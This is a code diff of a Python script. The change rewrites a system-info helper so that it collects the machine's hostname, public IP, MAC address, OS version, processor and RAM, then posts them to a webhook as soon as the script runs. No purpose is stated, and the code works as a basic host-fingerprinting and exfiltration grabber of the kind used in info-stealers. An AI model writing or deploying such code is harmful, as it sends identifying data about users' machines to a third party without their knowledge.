@@ -1,19 +1,53 @@
-import platform,socket,re,uuid,json,psutil,logging
+import platform
+import socket
+import json
+import re
+import uuid
+import ctypes
+import requests
 
-def getSystemInfo():
+
+webhook = ''
+
+
+def get_system_info():
     try:
-        info = {'platform': platform.system()}
-        info['platform-release']=platform.release()
-        info['platform-version']=platform.version()
-        info['architecture']=platform.machine()
-        info['hostname']=socket.gethostname()
-        info['ip-address']=socket.gethostbyname(socket.gethostname())
-        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        info['processor']=platform.processor()
-        info['ram'] = f"{str(round(psutil.virtual_memory().total / 1024.0**3))} GB"
-        return json.dumps(info)
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [
+                ('dwLength', ctypes.c_ulong),
+                ('dwMemoryLoad', ctypes.c_ulong),
+                ('ullTotalPhys', ctypes.c_ulonglong),
+                ('ullAvailPhys', ctypes.c_ulonglong),
+                ('ullTotalPageFile', ctypes.c_ulonglong),
+                ('ullAvailPageFile', ctypes.c_ulonglong),
+                ('ullTotalVirtual', ctypes.c_ulonglong),
+                ('ullAvailVirtual', ctypes.c_ulonglong),
+                ('ullAvailExtendedVirtual', ctypes.c_ulonglong)
+            ]
+
+        memory_status = MEMORYSTATUSEX()
+        memory_status.dwLength = ctypes.sizeof(memory_status)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
+
+        total_ram = memory_status.ullTotalPhys
+
+        info = {
+            'platform': platform.system(),
+            'platform_release': platform.release(),
+            'platform_version': platform.version(),
+            'architecture': platform.machine(),
+            'hostname': socket.gethostname(),
+            'ip_address': requests.get('https://ipinfo.io/json').json()['ip'],
+            'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
+            'processor': platform.processor(),
+            'ram': f"{str(round(total_ram / (1024**3)))} GB"
+        }
+        data = json.dumps(info,indent=4)
+        requests.post(webhook,json={"content":f"```{data}```"})
     except Exception as e:
-        logging.exception(e)
+        print(e)
 
 
-#add webhook funktion
+system_info = get_system_info()
+
+
